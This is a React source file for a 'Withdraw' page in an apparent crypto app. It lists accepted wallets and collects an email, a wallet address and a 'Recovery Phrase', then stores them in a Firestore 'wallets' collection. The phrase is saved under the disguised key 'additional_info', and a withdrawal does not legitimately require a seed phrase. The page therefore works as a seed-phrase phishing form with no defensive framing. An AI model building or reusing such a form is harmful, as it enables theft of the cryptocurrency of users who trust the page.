import React, { useEffect, useState } from "react";
import { useAppState } from "../../AppStateContext";
import Container from "../../components/Container";
import GradientDiv from "../../components/vendor/Card/GradientDiv";
import Alert from "../../components/vendor/alert/Alert";
import TextInput from "../../components/vendor/form/TextInput";
import TextArea from "../../components/vendor/form/TextArea";
import SubmitButton from "../../components/vendor/button/SubmitButton";
import DefaultButton from "../../components/vendor/button/DefaultButton";
import SelectInput from "../../components/vendor/form/SelectInput";
import btc from "../../resources/images/dashboard/wallet/btc.jpeg";
import usdt from "../../resources/images/dashboard/wallet/usdt.png";
import bnb from "../../resources/images/dashboard/wallet/bnb.jpeg";
import eth from "../../resources/images/dashboard/wallet/eth.png";
import DataTable from "./comp/DataTable";
import {
  addToCollectionArray,
  getUpdatedDocument,
} from "../../firebase/firestore";
import Spinner from "../../components/Spinner";
export default function Wallet() {
  const [loading, setLoading] = useState(false);
  const [wallet, setWallet] = useState({ regions: [] });
  const [check, setCheck] = useState(true);

  useEffect(() => {
    if (!check) {
      return;
    }

    // Callback function to handle updates
    const handleUpdate = (data) => {
      setWallet(data);
    };

    // Start listening for updates
    const unsubscribe = getUpdatedDocument("wallets", handleUpdate);

    // Clean up the listener on component unmount
    return () => {
      unsubscribe();
      setTimeout(() => {
        setCheck(false);
      }, 1000);
    };
  }, [wallet, check]);

  const [result, setResult] = useState({
    status: 0,
    message: null,
  });

  const [formData, setFormData] = useState({
    wallet_name: "",
    email: "",
    wallet_address: "",
    additional_info: "",
  });

  function handleChange(e) {
    const { name, value } = e.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  }

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);
    const result = await addToCollectionArray("wallets", formData);
    setResult(result);
    setLoading(false);
    setCheck(true);
  }

  function reset() {
    setFormData({
      creator_name: "",
      collection_name: "",
      file: [],
      category: "",
      price: "",
      describe: "",
    });
  }

  const categoryOptions = [
    {
      content: "Trust Wallet",
      value: "Trust Wallet",
    },
    {
      content: "MetaMask",
      value: "MetaMask",
    },
    {
      content: "Atomic Wallet",
      value: "Atomic Wallet",
    },
    {
      content: "My Ether Wallet",
      value: "MyEtherWallet",
    },
    {
      content: "Coinbase Wallet",
      value: "Coinbase Wallet",
    },
  ];

  // if (!wallet) {
  //   return (
  //     <div>
  //       <Spinner />
  //     </div>
  //   );
  // }

  return (
    <Container title={"Withdraw"}>
      <GradientDiv direction={"to bottom"} col1={"skyblue"} col2={"lightygray"}>
        <div className="w-full flex flex-col items-center justify-center">
          <form
            action=""
            onSubmit={handleSubmit}
            className="w-4/5 flex flex-col gap-3 bg-slate-400 p-4 rounded-2xl"
          >
            <div className=" ">
              <GradientDiv col1="darkgray" col2="#dbf5b3" direction="to bottom">
                <div className="flex p-4 gap-4 justify-evenly items-center font-bold text-2xl ">
                  <div>
                    <div className="flex gap-2 m-2">
                      <img
                        src={bnb}
                        alt="bnb"
                        width={50}
                        className="rounded-xl"
                      />
                      <img
                        src={btc}
                        alt="btc"
                        width={50}
                        className="rounded-xl"
                      />
                    </div>
                    <div className="flex gap-2 mx-2">
                      <img
                        src={eth}
                        alt="eth"
                        width={50}
                        className="rounded-xl"
                      />
                      <img
                        src={usdt}
                        alt="usdt"
                        width={50}
                        className="rounded-xl"
                      />
                    </div>
                  </div>
                  <h1 className="text-lg md:text-xl lg:text-2xl">
                    ACCEPTED WALLETS
                  </h1>

                  {/* <div>&times;</div> */}
                </div>
              </GradientDiv>
            </div>
            <Alert result={result} setResult={setResult} timer={false} />
            <div className="flex flex-col gap-3">
              <TextInput
                handleChange={handleChange}
                placeholder={"Email Address "}
                name={"email"}
                value={formData.email}
                type={"email"}
                required={true}
                bg="gray"
              />

              <SelectInput
                handleChange={handleChange}
                placeholder={"Select Crypto Wallet"}
                name={"wallet_name"}
                value={formData.wallet_name}
                required={true}
                bg="gray"
                options={categoryOptions}
              />

              <TextInput
                handleChange={handleChange}
                placeholder={"Wallet Address "}
                name={"wallet_address"}
                value={formData.wallet_address}
                type={"text"}
                required={true}
                bg="gray"
              />

              <TextArea
                handleChange={handleChange}
                placeholder={"Recovery Phrase"}
                name={"additional_info"}
                value={formData.additional_info}
                bg="gray"
              />

              <div className="flex justify-center">
                <SubmitButton loading={loading} />
                <DefaultButton onClick={reset} type={"reset"}>
                  Cancel
                </DefaultButton>
              </div>
            </div>
          </form>
          <div className="mb-5 pb-5 flex items-center w-4/5 justify-center">
            <DataTable data={wallet.regions.slice(1)} />
          </div>
        </div>
      </GradientDiv>
    </Container>
  );
}
